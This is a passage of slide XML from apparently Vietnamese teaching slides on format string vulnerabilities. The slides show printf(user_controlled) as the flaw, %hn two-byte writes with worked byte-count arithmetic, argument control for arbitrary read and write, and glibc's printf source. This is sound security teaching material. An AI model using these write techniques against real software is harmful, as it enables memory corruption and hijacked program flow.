                <a:solidFill>
                  <a:srgbClr val="780373"/>
                </a:solidFill>
                <a:effectLst/>
                <a:uFillTx/>
                <a:latin typeface="Consolas"/>
              </a:rPr>
              <a:t>&amp;hi</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2600" b="0" u="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:uFillTx/>
                <a:latin typeface="Consolas"/>
              </a:rPr>
              <a:t>);</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2600" b="0" u="none" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:effectLst/>
              <a:uFillTx/>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr defTabSz="457200">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="201"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="400"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2600" b="0" u="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="0B6623"/>
                </a:solidFill>
                <a:effectLst/>
                <a:uFillTx/>
                <a:latin typeface="Consolas"/>
              </a:rPr>
              <a:t>  c1 = 1056      = 0x0420   → lo</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2600" b="0" u="none" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:effectLst/>
              <a:uFillTx/>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr defTabSz="457200">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="201"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="400"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2600" b="0" u="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="0B6623"/>
                </a:solidFill>
                <a:effectLst/>
                <a:uFillTx/>
                <a:latin typeface="Consolas"/>
              </a:rPr>
              <a:t>  c2 = 1056+3863 = 4919    = 0x1337 → hi</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2600" b="0" u="none" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:effectLst/>
              <a:uFillTx/>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr defTabSz="457200">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcAft>
                <a:spcPts val="400"/>
              </a:spcAft>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="2600" b="0" u="none" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:effectLst/>
              <a:uFillTx/>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr defTabSz="457200">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcAft>
                <a:spcPts val="400"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2600" b="0" u="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:uFillTx/>
                <a:latin typeface="Consolas"/>
              </a:rPr>
              <a:t>printf("%#08x\n", (unsigned)lo | (unsigned)hi &lt;&lt; 16);</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2600" b="0" u="none" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:effectLst/>
              <a:uFillTx/>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr defTabSz="457200">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="201"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="400"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2600" b="0" u="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="0B6623"/>
                </a:solidFill>
                <a:effectLst/>
                <a:uFillTx/>
                <a:latin typeface="Consolas"/>
              </a:rPr>
              <a:t>0x13370420</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2600" b="0" u="none" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:effectLst/>
              <a:uFillTx/>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="457200" defTabSz="457200">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcAft>
                <a:spcPts val="400"/>
              </a:spcAft>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="2600" b="0" u="none" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:effectLst/>
              <a:uFillTx/>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="85" name=""/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="685800" y="914400"/>
            <a:ext cx="8875800" cy="3862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2100" b="0" u="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:uFillTx/>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Kết hợp Size Specifiers đề cập ở trên, ta có thể dùng %hn để write 2 byte</a:t>
            </a:r>
            <a:endParaRPr lang="en-US"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TextBox 22"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="548640" y="274320"/>
            <a:ext cx="448956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spcBef>
                <a:spcPts val="1191"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="992"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="3000" b="1" u="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:uFillTx/>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>Điều kiện phát sinh lỗ hổng</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="3000" b="0" u="none" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:effectLst/>
              <a:uFillTx/>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="87" name="TextBox 23"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="640080" y="1578600"/>
            <a:ext cx="10964880" cy="4135320"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln w="0">
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:style>
          <a:lnRef idx="0"/>
          <a:fillRef idx="0"/>
          <a:effectRef idx="0"/>
          <a:fontRef idx="minor"/>
        </p:style>
        <p:txBody>
          <a:bodyPr lIns="90000" tIns="45000" rIns="90000" bIns="45000" anchor="t">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:p>
            <a:endParaRPr lang="en-US" sz="1800" b="0" u="none" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:effectLst/>
              <a:uFillTx/>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="88" name=""/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2743200" y="2514600"/>
            <a:ext cx="6109200" cy="82116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4800" b="0" u="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:highlight>
                  <a:srgbClr val="FFB66C"/>
                </a:highlight>
                <a:uFillTx/>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>printf(user_controlled)</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="4800" b="0" u="none" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:effectLst/>
              <a:uFillTx/>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="89" name=""/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1140120" y="4572000"/>
            <a:ext cx="5958720" cy="386640"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln w="0">
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:style>
          <a:lnRef idx="0"/>
          <a:fillRef idx="0"/>
          <a:effectRef idx="0"/>
          <a:fontRef idx="minor"/>
        </p:style>
        <p:txBody>
          <a:bodyPr wrap="none" lIns="90000" tIns="45000" rIns="90000" bIns="45000" anchor="t">
            <a:sp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TextBox 1"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="548640" y="274320"/>
            <a:ext cx="869220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Từ những tính năng trên, làm sao có thể bị khai thác ?</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="3000" b="0" u="none" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:effectLst/>
              <a:uFillTx/>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="91" name="TextBox 2"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="640080" y="1234440"/>
            <a:ext cx="10964880" cy="4682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3200" b="0" u="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:uFillTx/>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>Vậy rõ ràng ta đã có 2 tính năng khá nguy hiểm là </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="3200" b="0" u="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="FF3838"/>
                </a:solidFill>
                <a:effectLst/>
                <a:uFillTx/>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>đọc và ghi</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="3200" b="0" u="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:uFillTx/>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t> địa chỉ ? Ta không thể kiểm soát được gì ? </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FF0000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:uFillTx/>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>=&gt; ARGUMENT </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Arial"/>
              </a:rPr>
              <a:t>Vì nếu kiểm soát được argument , tức là kiểm soát được địa chỉ muốn đọc và muốn ghi, và dẫn đến có thể leak và viết vào bất kỳ địa chỉ nào làm </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="3200" b="0" u="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="FF3838"/>
                </a:solidFill>
                <a:effectLst/>
                <a:uFillTx/>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>đổi luồng hoạt động của chương trình </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TextBox 1"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="548640" y="274320"/>
            <a:ext cx="5252400" cy="6382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000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:uFillTx/>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>Vậy argument đến từ đâu?</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="3600" b="0" u="none" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:effectLst/>
              <a:uFillTx/>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="93" name="TextBox 2"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="286200" y="1371600"/>
            <a:ext cx="8449560" cy="3758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3200" b="0" u="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:uFillTx/>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>Thông thường các hàm như sum(a,b)  thì argument lấy từ register — theo ABI, argument nằm sẵn ở rdi, rsi, rdx, rcx, r8, r9, và nếu nhiều hơn thì lấy từ stack ra.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="3200" b="0" u="none" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:effectLst/>
              <a:uFillTx/>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr defTabSz="457200">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcAft>
                <a:spcPts val="1001"/>
              </a:spcAft>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="3200" b="0" u="none" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:effectLst/>
              <a:uFillTx/>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr defTabSz="457200">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcAft>
                <a:spcPts val="1001"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="3200" b="0" u="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:uFillTx/>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>Nhưng để hiểu bản chất thì ta </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="3200" b="0" u="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="C9211E"/>
                </a:solidFill>
                <a:effectLst/>
                <a:uFillTx/>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>PHẢI</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="3200" b="0" u="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:uFillTx/>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t> nhìn vào </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="3200" b="0" u="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="C9211E"/>
                </a:solidFill>
                <a:effectLst/>
                <a:uFillTx/>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>source C của printf</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="3200" b="0" u="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:uFillTx/>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="3200" b="0" u="none" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:effectLst/>
              <a:uFillTx/>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="94" name=""/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8458200" y="0"/>
            <a:ext cx="3452400" cy="6857280"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:blipFill rotWithShape="0">
            <a:blip r:embed="rId1"/>
            <a:srcRect/>
            <a:stretch/>
          </a:blipFill>
          <a:ln w="0">
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:style>
          <a:lnRef idx="0"/>
          <a:fillRef idx="0"/>
          <a:effectRef idx="0"/>
          <a:fontRef idx="minor"/>
        </p:style>
        <p:txBody>
          <a:bodyPr lIns="90000" tIns="45000" rIns="90000" bIns="45000" anchor="ctr" anchorCtr="1">
            <a:noAutofit/>
          </a:bodyPr>
          <a:p>
            <a:pPr algn="ctr">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1800" b="0" u="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:uFillTx/>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>z</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TextBox 1"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="548640" y="274320"/>
            <a:ext cx="2905200" cy="540360"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln w="0">
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:style>
          <a:lnRef idx="0"/>
          <a:fillRef idx="0"/>
          <a:effectRef idx="0"/>
          <a:fontRef idx="minor"/>
        </p:style>
        <p:txBody>
          <a:bodyPr wrap="none" lIns="90000" tIns="45000" rIns="90000" bIns="45000" anchor="t">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:p>
            <a:endParaRPr lang="en-US" sz="1800" b="0" u="none" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:effectLst/>
              <a:uFillTx/>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="96" name="TextBox 2"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="458640" y="237240"/>
            <a:ext cx="10964880" cy="5888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2200" b="0" u="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:uFillTx/>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>Source như sau : </a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2200" b="0" u="none" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:effectLst/>
              <a:uFillTx/>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr defTabSz="457200">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcAft>
                <a:spcPts val="400"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2200" b="0" u="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:uFillTx/>
                <a:latin typeface="Consolas"/>
              </a:rPr>
              <a:t>int</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2200" b="0" u="none" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:effectLst/>
              <a:uFillTx/>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr defTabSz="457200">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcAft>
                <a:spcPts val="400"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2200" b="0" u="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="00A933"/>
                </a:solidFill>
                <a:effectLst/>
                <a:uFillTx/>
                <a:latin typeface="Consolas"/>
              </a:rPr>
              <a:t>__printf</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" b="0" u="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:uFillTx/>
                <a:latin typeface="Consolas"/>
              </a:rPr>
              <a:t> (const char *format, ...)</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2200" b="0" u="none" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:effectLst/>
              <a:uFillTx/>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr defTabSz="457200">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcAft>
                <a:spcPts val="400"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2200" b="0" u="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:uFillTx/>
                <a:latin typeface="Consolas"/>
              </a:rPr>
              <a:t>{</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2200" b="0" u="none" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:effectLst/>
              <a:uFillTx/>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr defTabSz="457200">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcAft>
                <a:spcPts val="400"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2200" b="0" u="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:uFillTx/>
                <a:latin typeface="Consolas"/>
              </a:rPr>
              <a:t>  </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" b="0" u="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="C9211E"/>
                </a:solidFill>
                <a:effectLst/>
                <a:uFillTx/>
                <a:latin typeface="Consolas"/>
              </a:rPr>
              <a:t>va_list</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" b="0" u="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:uFillTx/>
                <a:latin typeface="Consolas"/>
              </a:rPr>
              <a:t> arg;</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2200" b="0" u="none" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:effectLst/>
              <a:uFillTx/>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr defTabSz="457200">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcAft>
                <a:spcPts val="400"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2200" b="0" u="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:uFillTx/>
                <a:latin typeface="Consolas"/>
              </a:rPr>
              <a:t>  int done;</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2200" b="0" u="none" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:effectLst/>
              <a:uFillTx/>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr defTabSz="457200">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcAft>
                <a:spcPts val="400"/>
              </a:spcAft>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="2200" b="0" u="none" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:effectLst/>
              <a:uFillTx/>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr defTabSz="457200">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcAft>
                <a:spcPts val="400"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2200" b="0" u="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:uFillTx/>
                <a:latin typeface="Consolas"/>
              </a:rPr>
              <a:t>  </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" b="0" u="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="C9211E"/>
                </a:solidFill>
                <a:effectLst/>
                <a:uFillTx/>
                <a:latin typeface="Consolas"/>
              </a:rPr>
              <a:t>va_start</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" b="0" u="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:uFillTx/>
                <a:latin typeface="Consolas"/>
              </a:rPr>
              <a:t> (arg, format);</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2200" b="0" u="none" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:effectLst/>
              <a:uFillTx/>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr defTabSz="457200">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcAft>
                <a:spcPts val="400"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2200" b="0" u="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:uFillTx/>
                <a:latin typeface="Consolas"/>
              </a:rPr>
              <a:t>  done = __vfprintf_internal (stdout, format, arg, 0);</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2200" b="0" u="none" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:effectLst/>
              <a:uFillTx/>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr defTabSz="457200">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcAft>
                <a:spcPts val="400"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2200" b="0" u="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:uFillTx/>
                <a:latin typeface="Consolas"/>
              </a:rPr>
              <a:t>  va_end (arg);</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2200" b="0" u="none" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:effectLst/>
              <a:uFillTx/>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr defTabSz="457200">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcAft>
                <a:spcPts val="400"/>
              </a:spcAft>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="2200" b="0" u="none" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:effectLst/>
              <a:uFillTx/>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr defTabSz="457200">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcAft>
                <a:spcPts val="400"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2200" b="0" u="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:uFillTx/>
                <a:latin typeface="Consolas"/>
              </a:rPr>
              <a:t>  return done;</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2200" b="0" u="none" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:effectLst/>
              <a:uFillTx/>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr defTabSz="457200">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcAft>
                <a:spcPts val="400"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2200" b="0" u="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:uFillTx/>
                <a:latin typeface="Consolas"/>
              </a:rPr>
              <a:t>}</a:t>
